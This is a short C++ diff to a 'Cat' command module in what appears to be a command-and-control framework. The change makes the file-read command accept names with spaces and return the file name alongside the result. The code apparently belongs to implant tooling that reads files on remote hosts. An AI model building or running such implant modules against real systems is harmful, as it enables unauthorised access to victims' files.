@@ -39,9 +39,15 @@ std::string Cat::getInfo()
 
 int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
-	if (splitedCmd.size() == 2)
+	if (splitedCmd.size() >= 2 )
 	{
-		string inputFile = splitedCmd[1];
+		string inputFile;
+		for (int idx = 1; idx < splitedCmd.size(); idx++) 
+		{
+			if(!inputFile.empty())
+				inputFile+=" ";
+			inputFile+=splitedCmd[idx];
+		}
 
 		c2Message.set_instruction(splitedCmd[0]);
 		c2Message.set_inputfile(inputFile);
@@ -59,7 +65,7 @@ int Cat::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 int Cat::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
 	c2RetMessage.set_instruction(m_name);
-	c2RetMessage.set_cmd("");
+	c2RetMessage.set_cmd(c2Message.inputfile());
 	c2RetMessage.set_inputfile(c2Message.inputfile());
 
 	std::string inputFile = c2Message.inputfile();
